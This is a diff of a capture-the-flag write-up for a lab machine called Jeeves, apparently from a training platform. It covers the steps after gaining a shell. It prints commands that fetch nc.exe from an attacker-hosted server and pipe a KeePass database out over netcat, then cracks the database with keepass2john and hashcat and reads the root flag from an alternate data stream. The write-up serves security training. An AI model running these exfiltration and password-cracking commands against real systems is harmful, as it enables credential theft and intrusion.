@@ -43,15 +43,17 @@ We get a user shell as kohsuke.
 After a little bit of recon we come accross CEH.kdbx 
   
 This file format appears to be a keepass password file. Before we attempt to see the password we have to download the file to our local machine. 
+  
 ![](/assets/images/Jeeves/jeeveskdbx.PNG)
-I achieved this by downloading a netcat executable from the user shell we are in from a python http server that we host.
+
+ I achieved this by downloading a netcat executable from the user shell we are in from a python http server that we host.
   
 "powershell wget "http://localip:8000/nc.exe" -outfile nc.exe"
 The virtual machine cannot reach out to github to download the file from there
 Then "nc -lnvp <port> > CEH.kdbx" on your local machine and "nc.exe <local-ip> <same-port> < "CEH.kdbx" on the victim machine
 
 We need a password to open the kdbx file. Why dont we crack it? 
-I used this article as guidance, the main points summarized are:
+I used this article as guidance, the main points summarized are
                                                                                                
 https://www.rubydevices.com.au/blog/how-to-hack-keepass 
 download and use keepass2john on the kdbx file.
@@ -62,7 +64,9 @@ use hashcat to crack the file.
 
 ./hashcat -m 13400 -a 0 -w 1 CEH.hash <wordlist-file> 
  moonshine1 is the password to the keepass file
+  
  ![](/assets/images/Jeeves/jeeveskeepass1.png)
+ 
  ![](/assets/images/Jeeves/jeeveskeepass2.png)
  
  We find a hash in the keepass file under the title of Backup stuff
@@ -76,5 +80,6 @@ use hashcat to crack the file.
 
 admin has hm.txt file redirecting to actual file
 ![](/assets/images/Jeeves/jeeveshn.PNG)
-get-content .\hm.txt -stream root.txt
+
+ get-content .\hm.txt -stream root.txt
 and we get root flag :)
